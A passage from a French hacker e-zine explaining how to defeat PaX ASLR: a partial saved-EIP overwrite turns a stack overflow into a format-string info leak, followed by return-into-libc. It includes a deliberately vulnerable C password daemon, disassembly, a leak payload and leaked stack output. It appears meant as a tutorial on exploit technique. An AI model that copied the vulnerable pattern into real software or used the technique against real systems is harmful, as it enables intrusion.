  <p> Comme nous l'avons vu, la protection contre le return into PLT consiste 
    &agrave; mapper toutes les librairies n'importe o&ugrave; en m&eacute;moire 
    (y compris la partie 'base' de l'ex&eacute;cutable qui est relik&eacute;e 
    en librairie) &agrave; l'aide de la technique mmap(), d&eacute;j&agrave; utilis&eacute;e 
    dans openwall.<br>
    Mais, si on arrive &agrave; transformer un overflow en info leak (c'est-&agrave;-dire 
    r&eacute;cup&eacute;rer des infos internes au process sans le faire crasher, 
    et ce qui nous int&eacute;resse nous, ce sont les addresses de fonctions, 
    entre autres), alors tu peux faire de return into libc (ou return into plt), 
    comme s'il n'y avait jamais eu d'ASLR.<br>
    Certes, l'ASLR g&eacute;n&egrave;re un al&eacute;a sur toutes les addresses 
    cod&eacute;es en brutes dans les binaires, mais dans notre cas, le challenge 
    est de r&eacute;cup&eacute;rer les adressses en runtime, apr&egrave;s que 
    les librairies aient &eacute;t&eacute; mapp&eacute;es. Donc, gr&acirc;ce &agrave; 
    l'info leak, on peut deviner les addresses.<br>
    Illustrons cela :<br>
    1: A 2: B 3: C 4:D</p>
  <p>Soient A, B, C et D nos librairies et 1, 2, 3, 4 leurs addresses. Admettons 
    aussi que l'ensemble des possibles pour els addressse sont de 1 - 5000. Donc, 
    objectivement, paX peux mapper les libcs A, B, C et D n'importe o&ugrave; 
    entre 1 et 5000. Par cons&eacute;quent, on doit bannir d'embl&eacute;e les 
    techniques de brute-forcing apr&egrave;s qu'elles aient &eacute;t&eacute; 
    mapp&eacute;es (c'est-&agrave;-dire avant que le main() prenne la main). Mais, 
    si on devine par info leak leur addresse, l'addresse ne va pas changer si 
    on crash le process.<br>
    Pour les deviner, on peut imaginer plusieurs techniques. Celle illustr&eacute;e 
    dans Phrack 58 dans l'article de Tyler Durden est une technique de partial 
    eip overwrite et de retour dans des fonction d'output : on overwrite que 1 
    ou 2 bytes de saved_eip sur la stack. On peut donc utiliser 2 octets (m&ecirc;me 
    si on doit bruteforcer les 4 bits du 2&egrave;me byte), cela signifie en fait 
    qu'il n'y a que 16 combinaison &agrave; faire pour deviner une addresse relative 
    par rapport &agrave; la return address qui est sur la stack.<br>
    A noter que l'on peut maintenant overwirter 2 bytes, et non plus qu'un car 
    pax n'utilise plus une protection par pagination, mais par segmentation (il 
    utilise la limite des segments dans la GDT, plutot que de hijacker le handler 
    de page fault et filtrer laccess page par page), technique adotp&eacute;e, 
    apr&egrave;s la r&eacute;alisation du paper de tyler Durden...<br>
    Maintenant, prenons un exemple pratique.</p>
  <p> Techniquement, on peut exploiter ce partial eip overwrite par l'utilisation 
    de shellcodes alphanumeric par exemple [7]. Ce que l'on cherche &agrave; faire, 
    c'est de provoquer un buffer overflow en devinant un adresse de la libc, malgr&eacute; 
    le fait que la protection ASLR g&eacute;n&egrave;re des al&eacute;as dessus. 
    On pourrait avoir l'id&eacute;e d'utiliser un m&eacute;canisme de brute forcing, 
    mais ce que l'on veut en outre, c'est d'emp&ecirc;cher que le programme crash 
    (utile, si l'on veut l'exploiter :p).<br>
    Il va donc falloir d&eacute;gotter une faiblesse sur cette protection syst&egrave;me. 
    En fait, elle poss&egrave;de une faille. Voici un exemple de code vuln&eacute;rable 
    :</p>
  <p><br>
    &lt;++&gt; DHagainstpax/pax_daemon.c !d75c8383</p>
  <p>#include &lt;stdio.h&gt;<br>
    #include &lt;stdlib.h&gt;<br>
    #include &lt;string.h&gt;<br>
    #include &lt;unistd.h&gt;</p>
  <p>#define NL '\n'<br>
    #define CR '\r'<br>
    #define OKAY_PASS &quot;evil&quot;<br>
    #define FATAL(str) { perror(str); exit(-1); }</p>
  <p>int verify(char *pass);<br>
    int do_auth();</p>
  <p>char pass[48];<br>
    int len;</p>
  <p>int main(int argc, char **argv)<br>
    {<br>
    return (do_auth());<br>
    }</p>
  <p>/* Non-buggy passwd based authentication */<br>
    int do_auth()<br>
    {<br>
    printf(&quot;Password: &quot;);<br>
    fflush(stdout);<br>
    len = read(0, pass, sizeof(pass) - 1);<br>
    if (len &lt;= 0)<br>
    FATAL(&quot;read&quot;);<br>
    pass[len] = 0;<br>
    if (!verify(pass))<br>
    {<br>
    printf(&quot;Access granted .\n&quot;);<br>
    return (0);<br>
    }</p>
  <p> printf(&quot;You loose !&quot;);<br>
    fflush(stdout);<br>
    return (-1);<br>
    }</p>
  <p><br>
    /* Buggy password check (stack based overflow) */<br>
    int verify(char *pass)<br>
    {<br>
    char filtered_pass[32];<br>
    int i;</p>
  <p> bzero(filtered_pass, sizeof(filtered_pass));</p>
  <p> for (i = 0; pass[i] &amp;&amp; pass[i] != NL &amp;&amp; pass[i] != CR; i++)<br>
    filtered_pass[i] = pass[i];</p>
  <p> if (!strcmp(filtered_pass, OKAY_PASS))<br>
    return (0);</p>
  <p> return (-1);<br>
    }</p>
  <p>&lt;--&gt;</p>
  <p>Ce code affiche un prompte, attends qu'on lui rentre un password, et le compare 
    avec le password valide en filtrant les caract&egrave;res CR et NL :</p>
  <p> bash$ ./paxtestd<br>
    Password: toto<br>
    You loose !<br>
    bash$ ./paxtestd<br>
    Password: evil<br>
    Access granted .<br>
    bash$</p>
  <p>On s'aper&ccedil;oit que l'on est en pr&eacute;cens d'une vuln&eacute;rabiliter 
    de stack overflow sur ce d&eacute;mon au niveau du buffer filtered_pass[]. 
    Comment exploiter cette vuln&eacute;rabilit&eacute; en pr&eacute;sence d'une 
    protection &quot;PaX full random address space&quot;, la protection syst&egrave;me 
    ASLR ?</p>
  <p>Regardons plus pr&eacute;cisemment ce bout de code : </p>
  <p> (...)<br>
    printf(&quot;Password: &quot;);<br>
    fflush(stdout);<br>
    len = read(0, pass, sizeof(pass) - 1);<br>
    if (len &lt;= 0)<br>
    FATAL(&quot;read&quot;);<br>
    pass[len] = 0;<br>
    if (!verify(pass))<br>
    {<br>
    (...)</p>
  <p>en d&eacute;sassemblant avec gdb on obtient ceci :</p>
  <p> 804858c: 55 push %ebp<br>
    804858d: 89 e5 mov %esp,%ebp<br>
    804858f: 83 ec 08 sub $0x8,%esp<br>
    8048592: 83 c4 f4 add $0xfffffff4,%esp<br>
    8048595: 68 bc 86 04 08 push $0x80486bc<br>
    804859a: e8 5d fe ff ff call 80483fc &lt;printf&gt;<br>
    804859f: 83 c4 f4 add $0xfffffff4,%esp<br>
    80485a2: ff 35 00 98 04 08 pushl 0x8049800<br>
    80485a8: e8 1f fe ff ff call 80483cc &lt;fflush&gt;<br>
    80485ad: 83 c4 20 add $0x20,%esp<br>
    80485b0: 83 c4 fc add $0xfffffffc,%esp<br>
    80485b3: 6a 2f push $0x2f<br>
    80485b5: 68 20 98 04 08 push $0x8049820<br>
    80485ba: 6a 00 push $0x0<br>
    80485bc: e8 6b fe ff ff call 804842c &lt;read&gt;<br>
    80485c1: 89 c2 mov %eax,%edx<br>
    80485c3: 89 15 50 98 04 08 mov %edx,0x8049850<br>
    80485c9: 83 c4 10 add $0x10,%esp<br>
    80485cc: 85 d2 test %edx,%edx<br>
    80485ce: 7f 17 jg 80485e7 ; if (len &lt;= 0)<br>
    80485d0: 83 c4 f4 add $0xfffffff4,%esp<br>
    80485d3: 68 c7 86 04 08 push $0x80486c7<br>
    80485d8: e8 df fd ff ff call 80483bc &lt;perror&gt;<br>
    80485dd: 83 c4 f4 add $0xfffffff4,%esp<br>
    80485e0: 6a ff push $0xffffffff<br>
    80485e2: e8 35 fe ff ff call 804841c &lt;exit&gt;<br>
    80485e7: b8 20 98 04 08 mov $0x8049820,%eax<br>
    80485ec: c6 04 02 00 movb $0x0,(%edx,%eax,1)<br>
    80485f0: 83 c4 f4 add $0xfffffff4,%esp<br>
    80485f3: 50 push %eax<br>
    80485f4: e8 27 ff ff ff call 8048520 &lt;verify&gt;<br>
    80485f9: 83 c4 10 add $0x10,%esp</p>
  <p>Plus exactement ceci :</p>
  <p> (...)<br>
    8048595: 68 bc 86 04 08 push $0x80486bc<br>
    804859a: e8 5d fe ff ff call 80483fc &lt;printf&gt;<br>
    (...)<br>
    80485f4: e8 27 ff ff ff call 8048520 &lt;verify&gt;<br>
    80485f9: 83 c4 10 add $0x10,%esp</p>
  <p><br>
    Le 'call printf' et le 'call verify' sont clairement sur la m&ecirc;me page 
    offset, on le sait parce que 20 bits sup&eacute;rieurs sont les m&ecirc;mes. 
    Cela signifie qu'on est capable de retourner sur cette instruction en faisant 
    d&eacute;border l'EIP d'un byte. <br>
    SI on regarde l'&eacute;tat de la stack, on s'aper&ccedil;oit que le printf() 
    est appel&eacute; avec des param&egrave;tres d&eacute;j&agrave; pr&eacute;sent 
    sur la stack (le param&egrave;tres verify() par exemple). Par cons&eacute;quent, 
    en contr&ocirc;lant le premier param&egrave;tre de la fonction, on obtient 
    une format string al&eacute;atoire sur la fonction printf et on provoque d&egrave;s 
    lors un bug de format (une faille de format string). On appelera alors la 
    fonction vuln&eacute;rable &agrave; nouveau et on obtiendra alors une faille 
    de type return into libc classique : on aura qu'&agrave; faire revenir la 
    fonction sur l'instruction vuln&eacute;rable.</p>
  <p>On peut maintenant ce concocter un buffer de 37 byte (32 octets du buffer, 
    4 octets pour le FP et un octet pour l'EIP) pour l'input du password :</p>
  <p> &quot;%001$08u \x9a&quot;<br>
    &quot;%002$08u \x9a&quot;<br>
    &quot;%003$08u \x9a&quot;<br>
    &quot;%iii$08u \x9a&quot;</p>
  <p>ce bug de format lira le i&egrave;me param&egrave;tre sur la stack (iii$) 
    et l'affichera en tant qu'entier non sign&eacute; (%u) sur 8 caract&egrave;res 
    (8), en remplissant avec le caract&egrave;res '0' si n&eacute;cessaire (se 
    r&eacute;f&eacute;rer au page man de printf(3)).</p>
  <p> bash-2.05$ ./runit<br>
    [RECEIVED FROM SERVER] *Password: *<br>
    Connected! Press ^C to launch : Starting remote stack retreiving ...</p>
  <p> Remote stack :<br>
    00000000 08049820 0000002F 00000001<br>
    472ED57C 4728BE10 B9BDB84C 4727464F<br>
    080486B0 B9BDB8B4 472C6138 473A2A58<br>
    47281A90 B9BDB868 B9BDB888 472B42EB<br>
    00000001 B9BDB8B4 B9BDB8BC 0804868C</p>
  <p> bash-2.05$</p>
  <p>On lit ici 80 bytes, en provoquant 20 fois un bug de format, &agrave; chaque 
    fois incr&eacute;ment de 'iii'. D&egrave;s lors qu'on sait exploiter ce bug 
    de format, on peut &eacute;craser EIP (et le param&egrave;tre se trouvant 
    apr&egrave;s EIP sur la stack) afin d'obtenir une exploitation classique de 
    return-into-libc.</p>
  <p><br>
    3.2 CONDITIONS DE L'EXPLOITATION<br>
    ----------------------------------------------</p>
  <p> Cette exploitation et non seulement tr&egrave;s difficile mais n&eacute;cessite 
    en outre certains conditions sin&eacute; qua non.</p>
  <p> Avant tout, tous les overflows ne peuvent &ecirc;tre exploit&eacute;s ainsi. 
    Seuls les overflows octet par cotets du genre memcpy() et strncpy() sont vuln&eacute;rables. 
    Les overflows impliquant des fonctions utilisant un NUL byte ne sont pas vuln&eacute;rables.</p>
  <p> Pour notre exploitation on peut provoquer un return-into-write ou return-into-tout_autre_fonction_de_sortie 
    s'il n'y a oas de printf (ou send() ou wrtie() meme) dans les alentours de 
    l'adresse de retour originale, mais, selon la fonction de sortie utilis&eacute;, 
    il sera plus dur de mettre en place une attaque d&egrave;s lors qu'on aurait 
    &agrave; contr&ocirc;le un nombre plus important de param&egrave;tres de la 
    fonciton vulnerable.</p>
  <p> Notre technique souffre aussi des limitation impos&eacute;e par l'overwriting 
    du Frame Pointer [8]. SI le registre du frame pointer (%ebp) est utilis&eacute; 
    entre 'call printf' et 'call vuln_func', le programme crashera et on sera 
    alors incapable d'appeler vuln_func() &agrave; nouveau. Ainsi, des programmes 
    du style :</p>
  <p> /* Non-buggy passwd based authentication */<br>
    int do_auth()<br>
    {<br>
    int len;</p>
  <p> printf(&quot;Password: &quot;);<br>
    fflush(stdout);<br>
    len = read(0, pass, sizeof(pass) - 1);<br>
    if (len &lt;= 0)<br>
    FATAL(&quot;read&quot;);<br>
    pass[len] = 0;<br>
    if (!verify(pass))<br>
    (...)</p>
  <p> ne sont pas exploitable par return-into-libc parce que 'len' sera index&eacute; 
    dans %ebp apr&egrave;s le 'ret' de la fonction read() (rappelons que EBP permet 
    d'acc&eacute;der &agrave; la pile lors d'un appel de sous-prog). </p>
  <p><br>
    Enfin, Segvguard est un tool cod&eacute; apr Nergal et d&eacute;crit dans 
    son paper [3]. En gros, il ets utilis&eacute; pour interdire un ex&eacute;cutable 
    de se relancer s'il crashe trop de fois. Si segvguardest utilis&eacute;, on 
    ne peut exploiter un return-into-libc, sinon on peut d&eacute;border EIP de 
    2 octets puis brute-forcer les 4 bits sup&eacute;rieurs al&eacute;atoires 
    du deuxi&egrave;me octets d&eacute;bord&eacute;. On pourra alors retourner 
    sur un 'call printf' plus loin, ce qui accro&icirc;tra les chances d'exploitations.</p>
  <p></p>
  <p><br>
    5. ELFsh PROJECT<br>
    ---------------------</p>
  <p> Lanc&eacute; en 2003 par la team devhell, le projet ELFsh propose une impl&eacute;mentation 
    exp&eacute;rimentale de l'ASLR en userland sur les machines INTEL. Cette m&eacute;thode 
    permet de conserver la performance d'origine et, de ce fait, se distingue 
    sensiblement du patchs paX o&ugrave; la machine perd 200% de ses capacit&eacute;s. 
    Ici, le remapping est effectu&eacute; statiquement directement dans le binaire, 
    en modifiant l'adresse de chaque segment mapp&eacute;, et en relogeant l'ex&eacute;cutable 
    apr&egrave;s avoir recontruit ses tables de relocation. Cette impl&eacute;mentation 
    est fiable, elle consiste &agrave; relinker les binaire d'une distributions 
    en librairies dynamiques (ce qui demande de poss&eacute;daire de tous les 
    objets relogeables, ainsi que les makefile d'origine du package).<br>
    Cette impl&eacute;mentation ASLR admet toujours des faux positifs de relocation 
    (difficile &agrave; dt&eacute;ecter automatiquement) et elle n'est donc pas 
    parfaite, mais des &eacute;tudes sont toujours en cours &agrave; ce sujet.</p>
  <p></p>
  <p>6. CONCLUSION<br>
    ---------------------</p>
  <p> Il existe bien d'autre m&eacute;thodes pour bypasser ces protections toujours 
    plus efficaces. gera, d&eacute;taille une autre m&eacute;thode de bypass de 
    l'ASLR, assez semblable &agrave; celle de tyler Durden [9]. Mais il y en a 
    d'autres, ce qu'il faut c'est chercher. Certains se demandent comme les autres 
    font pour trouver de telles vuln&eacute;rabilit&eacute;s. Il suffit juste 
    d'appliquer ces trois points :</p>
  <p>1/ tu prends le paper de gera, tyler durden ou autre, tu l'&eacute;tudies 
    &agrave; fond et tu fais marcher tout le code <br>
    2/ tu appliques ca aux nouvelles vulnerabilit&eacute;s pour faire tes propres 
    exploits<br>
    3/ tu audites du code pour trouver tes propres vulns (le plus long)</p>
  <p>TRES peu de gens savent faire &ccedil;a, mais si tu sait faire, plus rien 
    ne te r&eacute;sistera</p>
  <p></p>
  <p>7. REFERENCES<br>
    -------------------------------------------------------------------------------------<br>
    R&eacute;f&eacute;rences :<br>
    [1] - &quot;Fun And Games With Evoluates Shellcodes&quot; - Nocte, TDC Mag 
    n&deg;4<br>
    [2] - &quot;Bypassing PaX ASLR protection&quot; - Tyler Durden, Phrack #59-0x09<br>
    [3] - &quot;The advanced return-into-libc exploit&quot; - Nergal, Phrack #58-0x04<br>
    [4] - The ELFsh project - http://www.devhell.org/~mayhem/projects/elfsh/ http://elfsh.devhell.org<br>
    [5] - The PaX Team - http://pageexec.virtualave.net<br>
    [6] - &quot;Smashing the Stack For Fun And Profit&quot; - Aleph1, Phrack #49-0x0e<br>
    [7] - &quot;Writing alphanumeric shellcodes&quot; - rix, Phrack #57-0x0f<br>
    [8] - &quot;Frame pointer overwriting&quot; - klog, phrack #55-0x08<br>
    [9] - &quot;advanced dlmalloc exploits&quot; - gera, Phrack #61<br>
    -------------------------------------------------------------------------------------</p>
  <p>THX : tyler durden (pour ses explications et le temps pass&eacute; &agrave; 
    m'expliquer les antres des syst&egrave;mes ELF :p), MeiK.</p>
  <p><br>
    Have fun,<br>
    Nocte / DHS (http://www.dhs-team.org - nocte@dhs-team.org)</p>
  <p>&nbsp;</p>
  <p align=center style='text-align:center'><span lang=EN-GB style='mso-ansi-language:
EN-GB'><br>
    </span><b><span lang=EN-GB style='font-size:10.0pt;font-family:Arial;
color:red;mso-ansi-language:EN-GB'>...::: Hacking By</span><span
lang=EN-GB style='font-size:10.0pt;font-family:Arial;mso-ansi-language:EN-GB'> 
    Nocte</span><span lang=EN-GB style='font-size:10.0pt;font-family:
Arial;color:red;mso-ansi-language:EN-GB'>:::...</span></b><span lang=EN-GB
style='mso-ansi-language:EN-GB'><o:p></o:p></span></p>
  <p align=center style='text-align:center'><span lang=EN-GB style='mso-ansi-language:
EN-GB'>&nbsp;</span><span lang=EN-GB
style='mso-ansi-language:EN-GB'><o:p></o:p></span><span lang=EN-GB style='mso-ansi-language:
EN-GB'><o:p></o:p></span></p>
  
 
  <p><span lang=EN-GB style='font-size:10.0pt;font-family:Verdana;mso-ansi-language:
EN-GB'>===================================================================== <br>
    6. FAILLES &amp; EXPLOITS: <b>DHS-Team Advisories</b> - DHS Team</span><span lang=EN-GB style='font-size:10.0pt;font-family:Verdana;mso-ansi-language:
EN-GB'> (parus dans http://www.wholetrack.eu.org)<br>
    ===================================================================== </span><span
lang=EN-GB style='mso-ansi-language:EN-GB'><o:p></o:p></span></p>
  <p>Depuis le dernier e-zine, DHS Team s'est &eacute;norm&eacute;ment investi 
    dans la s&eacute;curit&eacute;. Dans cette optique, elle a pu sortir quelques 
    advisories accompagn&eacute;s d'exploits pour certains. Thx &agrave; deux 
    members incomparables dans ce domaine : An0nym0uS et vRz. Dans le prochain 
    num&eacute;ro, un article complet sur le d&eacute;tail des failles, afin d'aider 
    ce qu'ils veulent s'investirent dans la s&eacute;curit&eacute;, sera publi&eacute;. 
    Vous pouvez les trouver sur le site &agrave; cet endroit : http://dealerhacksecurity.free.fr/release 
    et sur la mailing liste fran&ccedil;aise : http://www.wholetrack.eu.org. Par 
    cons&eacute;quent, on ne les publiera pas ici, plut&ocirc;t que de les recopier 
    b&ecirc;tement, on sortira un article beaucoup plus complet sur l'explication 
    des vuln&eacute;rabilit&eacute;s, la r&eacute;alisation d'explois, et la mise 
    en place de patchs.</p>
  <p>&nbsp;</p>
  <p><span style='font-size:10.0pt;font-family:Verdana'> ===================================================================== 
    <br>
    The end :) Et voilà ! Ce numéro copieux et riches en aventures touche à sa 
    fin. Prenez le temps de lire, tester, méditez et bien cogitez sur les articles 
    proposés. J'espère que nos nouveaux objectifs en matière de sécurité vous 
    donneront l'envie de vous investir davantage dans ce domaine et surtout d'avoir 
    pour état d'esprit non pas d'exploiter stupidement une faille trouvée, mais 
    bien plutôt de faire les démarches nécessaires afin qu'elle soit comblée au 
    plus tôt. Pour cela, le meilleur moyen et de coder un exploit puis de mailer 
    à la société concerné, soit de développer un patch de sécurité... <br>
    </span><span lang=EN-GB style='font-size:10.0pt;font-family:Verdana;mso-ansi-language:
EN-GB'>Have fun Y'all ;)</span><span lang=EN-GB style='mso-ansi-language:EN-GB'><o:p></o:p></span></p>
  <p><span style='font-size:10.0pt;font-family:Verdana'>Bon, sur ce, je
terminerai par ce poème d'un hacker anonyme : </span></p>

<p><span style='font-size:10.0pt;font-family:Verdana'><br>
</span><span style='font-size:7.5pt;font-family:Verdana;color:#00CC00'>010110100111
<br>
101010100100 <br>
100011010111 <br>
110010101000 </span></p>

<p><span style='font-size:7.5pt;font-family:Verdana;color:#00CC00'>100010101111
<br>
100010101110 <br>
001011011011 <br>
101100110010 </span></p>

<p><span style='font-size:7.5pt;font-family:Verdana;color:#00CC00'>101101010010
<br>
010101011010 <br>
010111010011 </span></p>

<p><span style='font-size:7.5pt;font-family:Verdana;color:#00CC00'>101001010111
<br>
010101001111 <br>
111010010111 </span></p>

  <p align=center style='text-align:center'><span style='font-size:10.0pt;
font-family:Verdana'>Visitez notre WebSite: <a
href="http://dealer-hack.ifrance.com" target="_blank">http://www.dhs-team.org</a> 
    - chan irc : paris.fr.kewl.org #dhs-team</span></p>

<p align=center style='text-align:center'><span style='font-size:10.0pt;
font-family:Verdana'>Passer faire un tour sur le WebSite de ArenHack : <a
href="http://dealer-hack.ifrance.com" target="_blank">http://www.arenhack.com</a></span></p>

  <p align=center style='text-align:center'><span style='font-size:10.0pt;
font-family:Verdana'>Vous avez des questions à propos du nos Mag's ? Un sujet 
    vous intrigue ? Lâchez vous sur notre forum : <a
href="http://dealerhacksecurity.free.fr/forum" target="_blank">http://dealerhacksecurity.free.fr/forum</a></span></p>
  <p align=center style='text-align:center'><span style="font-family: Verdana; font-size: 10.0pt;">(Attention, 
    il va bient&ocirc;t changer d'addresse !! Vous serez mis au courant sur le 
    forum...)</span></p>

<p align=center style='text-align:center'><b><span lang=EN-GB style='font-size:
10.0pt;font-family:Verdana;mso-ansi-language:EN-GB'>By</span></b><span
lang=EN-GB style='mso-ansi-language:EN-GB'> </span><b><span lang=EN-GB
style='font-size:10.0pt;font-family:Verdana;mso-ansi-language:EN-GB'>DHS Team -
The Dealer Hack Security Team</span></b><span lang=EN-GB style='mso-ansi-language:
EN-GB'><o:p></o:p></span></p>

</div>

</body>

</html>
